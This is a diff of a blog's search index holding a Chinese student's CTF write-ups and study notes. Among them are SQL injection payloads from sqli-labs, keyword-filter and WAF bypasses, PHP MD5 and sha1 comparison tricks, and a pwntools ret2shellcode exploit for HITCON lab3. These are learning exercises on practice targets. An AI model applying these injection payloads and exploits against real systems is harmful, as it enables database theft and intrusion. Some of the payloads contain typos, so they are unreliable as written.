@@ -1,6 +1,25 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Mysql函数用法</title>
+    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<ol>
+<li>count()：汇总数据函数</li>
+<li>rand()：随机输出一个小于1的正数</li>
+<li>floor()：把输出的结果取整</li>
+<li>group by语句：把结果分组输出</li>
+<li>concat()：连接两条语句</li>
+</ol>
+]]></content>
+      <categories>
+        <category>数据库学习</category>
+      </categories>
+      <tags>
+        <tag>Mysql</tag>
+        <tag>函数用法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hitcon lab1</title>
     <url>/2019/04/17/Hitcon-lab1/</url>
     <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
@@ -27,6 +46,64 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
       </categories>
       <tags>
         <tag>Hitcon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku 备份文件 wirteup</title>
+    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
+    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
+<p>利用==比较漏洞</p>
+<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
+<a id="more"></a>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p>下列的字符串的MD5值都是0e开头的：</p>
+<p>QNKCDZO</p>
+<p>240610708</p>
+<p>s878926199a</p>
+<p>s155964671a</p>
+<p>s214587387a</p>
+<p>s214587387a</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku 构造函数 wirteup</title>
+    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
+    <content><![CDATA[<?php
+highlight_file('flag.php');
+$_GET['id'] = urldecode($_GET['id']);
+$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
+if (isset($_GET['uname']) and isset($_POST['passwd'])) {
+    if ($_GET['uname'] == $_POST['passwd'])
+
+        print 'passwd can not be uname.';
+
+    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
+
+        die('Flag: '.$flag);
+
+    else
+
+        print 'sorry!';
+
+}
+?>
+
+<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
+<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
       </tags>
   </entry>
   <entry>
@@ -103,49 +180,6 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
       </tags>
   </entry>
   <entry>
-    <title>Mysql函数用法</title>
-    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<ol>
-<li>count()：汇总数据函数</li>
-<li>rand()：随机输出一个小于1的正数</li>
-<li>floor()：把输出的结果取整</li>
-<li>group by语句：把结果分组输出</li>
-<li>concat()：连接两条语句</li>
-</ol>
-]]></content>
-      <categories>
-        <category>数据库学习</category>
-      </categories>
-      <tags>
-        <tag>Mysql</tag>
-        <tag>函数用法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku 备份文件 wirteup</title>
-    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
-    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
-<p>利用==比较漏洞</p>
-<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
-<a id="more"></a>
-<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
-<p>下列的字符串的MD5值都是0e开头的：</p>
-<p>QNKCDZO</p>
-<p>240610708</p>
-<p>s878926199a</p>
-<p>s155964671a</p>
-<p>s214587387a</p>
-<p>s214587387a</p>
-]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bugku 文件上传 wirteup</title>
     <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
     <content><![CDATA[<p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
@@ -161,95 +195,6 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
         <tag>Web</tag>
         <tag>ctf学习</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>bugku 构造函数 wirteup</title>
-    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
-    <content><![CDATA[<?php
-highlight_file('flag.php');
-$_GET['id'] = urldecode($_GET['id']);
-$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
-if (isset($_GET['uname']) and isset($_POST['passwd'])) {
-    if ($_GET['uname'] == $_POST['passwd'])
-
-        print 'passwd can not be uname.';
-
-    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
-
-        die('Flag: '.$flag);
-
-    else
-
-        print 'sorry!';
-
-}
-?>
-
-<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
-<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
-]]></content>
-      <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hitcon  lab3 </title>
-    <url>/2019/04/18/hitcon-lab3/</url>
-    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
-<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
-<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
-
-由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
-
-首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><a id="more"></a>
-
-<p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
-<pre><code>地址为0x0804A060
-
-直接上exp：
-
-from pwn import *
-
-&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
-
-context.log_level = &apos;debug&apos;
-
-io = process(&apos;ret2sc&apos;)
-
-sc = asm(shellcraft.sh())
-
-ret2 = &apos;A&apos;*32 + p32(0x0804A060)
-
-io.sendafter(&apos;Name:&apos;,sc)
-
-io.sendafter(&apos;best:&apos;,ret2)
-
-io.interactive()
-
-直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
-<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
-      <categories>
-        <category>逆向学习</category>
-      </categories>
-      <tags>
-        <tag>Hitcon</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf web easy calc wirteup</title>
-    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
-    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
-<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
-<a id="more"></a>
-<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
-<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
-<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
-<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
-]]></content>
   </entry>
   <entry>
     <title>calc2</title>
@@ -300,6 +245,106 @@ if(strpos($str,&quot;flag&quot;)!==false)
       </tags>
   </entry>
   <entry>
+    <title>i春秋 sql绕过 wirteup</title>
+    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
+    <content><![CDATA[<p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
+<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
+<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>ctf学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuctf web easy calc wirteup</title>
+    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
+    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
+<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
+<a id="more"></a>
+<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>hitcon  lab3 </title>
+    <url>/2019/04/18/hitcon-lab3/</url>
+    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
+<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
+<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
+
+由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
+
+首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><a id="more"></a>
+
+<p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
+<pre><code>地址为0x0804A060
+
+直接上exp：
+
+from pwn import *
+
+&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
+
+context.log_level = &apos;debug&apos;
+
+io = process(&apos;ret2sc&apos;)
+
+sc = asm(shellcraft.sh())
+
+ret2 = &apos;A&apos;*32 + p32(0x0804A060)
+
+io.sendafter(&apos;Name:&apos;,sc)
+
+io.sendafter(&apos;best:&apos;,ret2)
+
+io.interactive()
+
+直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
+<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
+      <categories>
+        <category>逆向学习</category>
+      </categories>
+      <tags>
+        <tag>Hitcon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php函数学习</title>
+    <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
+<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
+<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
+]]></content>
+      <categories>
+        <category>编程</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python库</title>
+    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
+<a id="more"></a>
+<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
+]]></content>
+      <categories>
+        <category>编程</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>i春秋 sqli wirteup</title>
     <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/</url>
     <content><![CDATA[<p>sql注入时，逗号被过滤后可用payload</p>
@@ -338,48 +383,20 @@ if(strpos($str,&quot;flag&quot;)!==false)
       </tags>
   </entry>
   <entry>
-    <title>i春秋 sql绕过 wirteup</title>
-    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
-    <content><![CDATA[<p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
-<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
-<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
-]]></content>
+    <title>sqli-labs</title>
+    <url>/2019/12/25/sqli-lab/</url>
+    <content><![CDATA[<p>前言</p>
+<pre><code>最近在研究sql注入，sqli-labs是一个专业的sql注入练习平台，于是自己搭建了一个，记录一下学习过程。</code></pre><p>Less-1</p>
+<p> 根据提示可以知道，这是一道单引号注入的题目<br> 首先他让我们输入ID<br><img src="/2019/12/25/sqli-lab/05ab1d2d3f4f5421f749a046d8f3a56.png" alt><br>    先get一个参数进行测试</p>
+<a id="more"></a>    
+<p><img src="/2019/12/25/sqli-lab/d336f99bd2f6e61ef828e16e4b4d2b0.png" alt><br>    正常回显，根据提示进行单引号测试<br><img src="/2019/12/25/sqli-lab/b8c6f552da136996e0fb2847121c8d2.png" alt><br>    可以发现已经报错，这里先把报错语句拿出来<br>    ‘’1’’ LIMIT 0,1’ at line 1<br>    这里首尾两个’是输出用的而 ‘1’’ 中的1’便是你输入的参数值<br>    将这个语句放入正常语句中进行分析<br>    select * from A where id =’1’’ limit 0,1<br>    可以发现正是由于id值中传入了一个 ‘ ,使得正常的语句多了一个 ‘ 发生了错误。<br>    所以我们可以利用这一点，构造我们需要的语句<br>    select * from A where id =’1’ 需要的注入语句 –+’ limit 0,1<br>    这样我们就可以通过不同的注入语句获得我们需要的信息<br>    注入的通常流程：<br>        1、确定现有sql语句到底查询了多少个字段以及各字段的类型<br>        2、确定了字段个数再查询显示位<br>        3、在从当前显示位上查询出当前数据库、当前用户等我们所需要的数据<br>    实际操作一下<br>    构造字段查询语句<br>    payload：’ order by 3 –+<br>    可以看到页面正常回显<br><img src="/2019/12/25/sqli-lab/3785c8fcbaff654858efb5899d54a93.png" alt><br>    将3改为4<br><img src="/2019/12/25/sqli-lab/a30015d7c3cbff602cc0443c9ffd91e.png" alt><br>    发生报错，证明只存在三个字段<br>    接着确定可以回显的字段<br>    payload：-1’ union select 1,2,3 –+<br><img src="/2019/12/25/sqli-lab/81e3539614352a2e5bf5eece18a765f.png" alt><br>    可以看到2，3被显示在页面上，也就是说我们要将查询语句构造在2，3号位才可以获得相应的数据<br>    下面列出几个常用的查询语句：<br>        1、查询表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_scheme= database() –+<br>        2、查询列：-1’ union selecr 1,group_concat(column_name),3 from information_schema.conluns where table_name=”users” –+<br>        3、查询字段：-1’ union select 1,group_concat(A,B,C),3 from users –+<br>    注：仅使用于MySQL数据库&gt;=5.0.1以上版本</p>
+<pre><code>-------------------分割线------------------</code></pre>]]></content>
       <categories>
-        <category>CTF学习</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>ctf学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php函数学习</title>
-    <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
-<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
-<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
-]]></content>
-      <categories>
-        <category>编程</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python库</title>
-    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
-<a id="more"></a>
-<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
-]]></content>
-      <categories>
-        <category>编程</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -410,59 +427,6 @@ eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</
       <tags>
         <tag>Web</tag>
         <tag>注入技巧</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs</title>
-    <url>/2019/12/25/sqli-lab/</url>
-    <content><![CDATA[<p>前言</p>
-<pre><code>最近在研究sql注入，sqli-labs是一个专业的sql注入练习平台，于是自己搭建了一个，记录一下学习过程。</code></pre><p>Less-1</p>
-<pre><code>根据提示可以知道，这是一道单引号注入的题目
-首先他让我们输入ID
-i[](./sqli-lab/05ab1d2d3f4f5421f749a046d8f3a56.png)    
-先get一个参数进行测试</code></pre><a id="more"></a>    
-<pre><code>i[](./sqli-lab/d336f99bd2f6e61ef828e16e4b4d2b0.png)    
-正常回显，根据提示进行单引号测试    
-i[](./sqli-lab/b8c6f552da136996e0fb2847121c8d2.png)    
-可以发现已经报错，这里先把报错语句拿出来    
-&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1    
-这里首尾两个’是输出用的而 &apos;1&apos;&apos; 中的1&apos;便是你输入的参数值
-将这个语句放入正常语句中进行分析    
-select * from A where id =&apos;1&apos;&apos; limit 0,1    
-可以发现正是由于id值中传入了一个 &apos; ,使得正常的语句多了一个 &apos; 发生了错误。
-所以我们可以利用这一点，构造我们需要的语句
-select * from A where id =&apos;1&apos; 需要的注入语句 --+&apos; limit 0,1
-这样我们就可以通过不同的注入语句获得我们需要的信息
-注入的通常流程：
-    1、确定现有sql语句到底查询了多少个字段以及各字段的类型
-    2、确定了字段个数再查询显示位
-    3、在从当前显示位上查询出当前数据库、当前用户等我们所需要的数据
-实际操作一下
-构造字段查询语句
-payload：&apos; order by 3 --+
-可以看到页面正常回显
-i[](./sqli-lab/3785c8fcbaff654858efb5899d54a93.png)
-将3改为4
-i[](./sqli-lab/a30015d7c3cbff602cc0443c9ffd91e.png)
-发生报错，证明只存在三个字段
-接着确定可以回显的字段
-payload：-1&apos; union select 1,2,3 --+
-i[](./sqli-lab/81e3539614352a2e5bf5eece18a765f.png)
-可以看到2，3被显示在页面上，也就是说我们要将查询语句构造在2，3号位才可以获得相应的数据
-下面列出几个常用的查询语句：
-    1、查询表：-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_scheme= database() --+
-    2、查询列：-1&apos; union selecr 1,group_concat(column_name),3 from information_schema.conluns where table_name=&quot;users&quot; --+
-    3、查询字段：-1&apos; union select 1,group_concat(A,B,C),3 from users --+
-注：仅使用于MySQL数据库&gt;=5.0.1以上版本
-
-
--------------------分割线------------------</code></pre>]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>sqli-lab</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
 </search>
